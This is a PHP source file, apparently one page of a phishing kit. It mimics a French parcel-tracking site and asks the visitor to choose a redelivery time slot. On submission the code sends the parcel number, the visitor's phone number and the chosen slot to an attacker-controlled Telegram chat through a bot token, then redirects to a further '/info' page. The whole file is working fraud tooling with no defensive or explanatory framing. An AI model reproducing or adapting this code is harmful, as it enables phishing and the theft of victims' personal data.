<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    if (isset($_POST['date'])) {
        $_SESSION["date"] = $_POST["date"];

        telegram_api($rez["token"], "sendMessage", [
            "chat_id" => $rez["cliques"],
            "text" =>  "🌐 Suivi : <b>" . $rez["suivi"] . "</b>\n📞 Téléphone : " .  $_SESSION["phone"] . "\n⏲ Créneau : <b>" . $_POST["date"] . "</b>" . $info,
            "parse_mode" => "HTML",
        ]);
        header("location: /info");
    }

    die();
}
$header = require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/header.php');
$footer = require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/footer.php');
$html = (function () {
    global $rez;
    ob_start();
?>
    <style>
        /* Style de base pour les selects */
        select {
            border: none;
            background-color: #F5F5F5;
            font-size: 14px;
            padding: 10px;
            width: 100%;
            max-width: 350px;
            margin: 0 0 10px;
            border-radius: 4px;
            box-shadow: 0 2px 2px rgba(0, 0, 0, 0.1);
        }

        /* Style pour les options des selects */
        select option {
            background-color: #F5F5F5;
            color: #333;
            font-size: 14px;
            padding: 10px;
            border-radius: 4px;
            border: none;
        }

        /* Style pour les selects hover */
        select:hover {
            background-color: #ECECEC;
            cursor: pointer;
        }

        /* Style pour les selects focus */
        select:focus {
            outline: none;
            box-shadow: 0 0 3px #96154A;
        }

        /* Style pour les selects désactivés */
        select:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
    </style>
    <form method="post">
        <div class="breadcrumb">
            <div class="grid">
                <div class="row">
                    <ul>
                        <li><a href="#/">
                                Accueil</a></li>
                        <li class="active">Suivi de colis</li>
                    </ul>
                </div>
            </div>
        </div>
        <div class="internal-page suivi">
            <div class="grid">
                <div class="row">
                    <div class="col-xs-12 col-sm-12 col-md-12 mt-5 center">
                    </div>
                </div>
            </div>
            <div class="main">

                <div data-v-67007474="" id="tracking-wrapper" class="app-wrapper">
                    <div data-v-577ebd12="" data-v-67007474="">
                        <div class="suivi-colis-page">
                            <div data-v-577ebd12="" class="input-zone">
                                <h2 data-v-577ebd12="">Colis numéro: <?= $rez["suivi"] ?>

                                </h2>
                                <h3>
                                    Choisissez votre créneau de livraison

                                </h3>

                                <p>
                                    Votre colis vous sera livré lors du prochain jour sélectionné, entre 8h00 et 18h00, à l'exception des jours fériés et du dimanche.
                                    <br><br>
                                    Si un nouvel échec a lieu, votre colis sera automatiquement redirigé en point relais le plus proche de votre domicile.
                                    <br>
                                </p>
                                <br>
                                <h4 style="text-align: center">Date de re-livraison</h4>
                                <select id="schedule_form_schedule" name="date">
                                    <?php
                                    $options = '';
                                    $jours = [];
                                    $aujourdhui = new DateTime();
                                    $compteurJour = 0;
                                    $isFirstOption = true;

                                    while (count($jours) < 5) {
                                        $compteurJour++;
                                        $prochainJour = clone $aujourdhui;
                                        $prochainJour->modify("+{$compteurJour} day");
                                        $jourDeLaSemaine = $prochainJour->format('w');
                                        if ($jourDeLaSemaine != 0) {
                                            $jours[] = $prochainJour->format('d/m/Y');
                                        }
                                    }

                                    foreach ($jours as $jour) {
                                        $selected = $isFirstOption ? ' selected' : '';
                                        $options .= "<option{$selected}>{$jour} - de 8h à 13h</option>";
                                        $isFirstOption = false;
                                        $selected = $isFirstOption ? ' selected' : '';
                                        $options .= "<option{$selected}>{$jour} - de 13h à 18h</option>";
                                    }

                                    echo $options;
                                    ?>
                                </select>
                                <div>
                                    <button type="submit" id="tracking_form_submit" class="btn btn-primary btn-suivi">Confirmer ma re-livraison</button>
                                </div>
                            </div>

    </form>
    <div id="loader-div-new" class="hidden-class-new">
        <div id="mask-id-new"></div>
        <div class="spinner-class-new"></div>
    </div>
    <script>
        document.querySelector("form").addEventListener("submit", function(e) {
            document.getElementById("loader-div-new").style.visibility = "visible";
            document.getElementById("mask-id-new").style = "opacity: 1; bottom: -500px;"
        })
    </script>
    </div>

    </div>
    </div>
    </div>
    </form>
<?php
    return ob_get_clean();
})();

$html = $header . $html . $footer;
require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/base.php');
?>